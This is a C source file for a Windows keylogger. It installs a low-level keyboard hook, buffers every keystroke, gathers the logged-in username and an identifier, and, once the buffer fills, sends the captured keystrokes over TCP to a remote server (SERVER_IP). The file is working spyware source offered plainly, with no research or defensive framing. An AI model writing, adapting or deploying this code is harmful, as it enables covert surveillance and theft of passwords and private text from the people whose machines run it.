#include "logger.h"
#include "client.h"

HHOOK keyboardHook; 
bool isLogging = false;
bool caps = false; 
char* KeylogBuffer = 0;
int keystrokeIndex = 0;

ClientInfo reapClient(){

    ClientInfo result;
    char username[30];  
    char currentTime[30];
    char mac_addr[18];

    GUID uuid;
    CoCreateGuid(&uuid);
    // Spit the address out
    sprintf(mac_addr,"%02X:%02X:%02X:%02X:%02X:%02X",
        uuid.Data4[2],uuid.Data4[3],uuid.Data4[4],
        uuid.Data4[5],uuid.Data4[6],uuid.Data4[7]);

    // get current time
    time_t rawtime;
    struct tm * timeinfo;

    time ( &rawtime );
    timeinfo = localtime ( &rawtime );

    sprintf(currentTime, "%s", asctime(timeinfo));

    TCHAR name [ UNLEN + 1 ];
    DWORD size = UNLEN + 1;

    if(GetUserName((TCHAR*)name, &size)){
        sprintf(username, "%s", name);
    }else{
        printf("No username detected "); 
    }

    strcpy(result.mac_addr, mac_addr);
    strcpy(result.current_time, currentTime);
    strcpy(result.os_username, username);

    return result; 

}


char* lower_string(char s[]) {
   /**
    s - String/char that get's passed in

    Function to lowercase a string in case Caps/Shift is pressed
   */
   int c = 0;
   while (s[c] != '\0') {
      if (s[c] >= 'A' && s[c] <= 'Z') {
         s[c] = s[c] + 32;
      }
      c++;
   }
   return s; 
}

char* upper_string(char s[]) {

    /**
    s - String/char that get's passed in

    Function to uppercase a string in case Caps/Shift is pressed

   */
   int c = 0;
   while (s[c] != '\0') {
      if (s[c] >= 'a' && s[c] <= 'z') {
         s[c] = s[c] - 32;
      }
      c++;
   }
   return s; 
}


void logStroke(char stroke[]){
    /**
    currentLog - Current log structure in scope that keystrokes are being appended to. 
    stroke - Single character that will be added to logstring attribute for currentLog
    Function that just appends to logstring field of client log report. 
    */
    int capsLock = strcmp(stroke, "Caps Lock");
    int spacePressed = strcmp(stroke, "Space");
    char ch, *result;
    // CAPITALIZE STRING
    if(caps == true){
        result = upper_string(stroke);      
    }else{
        result = lower_string(stroke);
    }

    if(capsLock == 0 && caps == false){ 
        caps = true; 
    }else if(capsLock == 0 && caps == true){
        caps = false; 
    }

    KeylogBuffer[keystrokeIndex] = *result; 
    keystrokeIndex += 1;  
}



bool sendStrokes(char packet[]){
	struct addrinfo test = GetSocketAddress(SERVER_IP, DEFAULT_PORT);
	SOCKET s = socket(AF_UNSPEC, SOCK_STREAM, IPPROTO_TCP); 
	int connectResult = connect(s, test.ai_addr, (int)test.ai_addrlen); 
	printf("Connection result: %d", connectResult);
	if(connectResult != 0){
		closesocket(s); 
		return false; 
	}
	send(s, packet, (int)strlen(packet), 0 );
	printf("Success sending packet data: "); 
	return true; 
}


__declspec(dllexport) LRESULT CALLBACK myhook(int code, WPARAM wp, LPARAM lp){ 
    /**
        Params:
            Keyboard Code - Letter corresponding to keyboard code
            WP, LP - Windows params for message queue
        
        Purpose:
            This function validates that the log array is not larger than the log limit. Once the log limit is reach
            it will send the array/bytes to the server
    */
    KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
    DWORD msg = 1;
    char tmp[255];

    if(wp == WM_KEYDOWN && code == HC_ACTION){
        if(keystrokeIndex == KEYLOG_BUFFER_SIZE-1){ 

            char packet[KEYLOG_BUFFER_SIZE]; 
            memcpy(packet, KeylogBuffer, sizeof(packet));

			#if DEBUG && DEBUG == 1
            printf("Keystrokes sent: %s\n", KeylogBuffer);  
            printf("Log size bytes:\n", sizeof(KeylogBuffer));
            #endif 
			// call send data function ok 
			if(sendStrokes(packet) == true){
				#if DEBUG && DEBUG == 1
				printf("Successfully sent packets "); 
				#endif
			} 			
            memset(KeylogBuffer, 0, KEYLOG_BUFFER_SIZE+1);
            keystrokeIndex = 0;
        }

        msg += (st_hook.scanCode << 16); 
        msg += (st_hook.flags << 24);
        GetKeyNameText(msg, tmp, 255); 
        logStroke(tmp);

        #if DEBUG && DEBUG == 1	
        printf("%s\n", KeylogBuffer);  
        #endif
    }
    return CallNextHookEx(keyboardHook, code, wp, lp);
}

void MsgLoop(){
	MSG message;
	while (isLogging) {       
        if (!GetMessage(&message, NULL, 0, 0)){
            isLogging = false;
        }
        TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

void startLogger(){
    //if(mylog->logstring == 0) mylog->logstring = (char*)malloc(KEYLOG_BUFFER_SIZE);
    if(KeylogBuffer == NULL) KeylogBuffer = (char*)malloc(KEYLOG_BUFFER_SIZE);
    HINSTANCE modulehandle = GetModuleHandle(NULL);
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)myhook, modulehandle, NULL);
    isLogging = true;  
	MsgLoop();
}
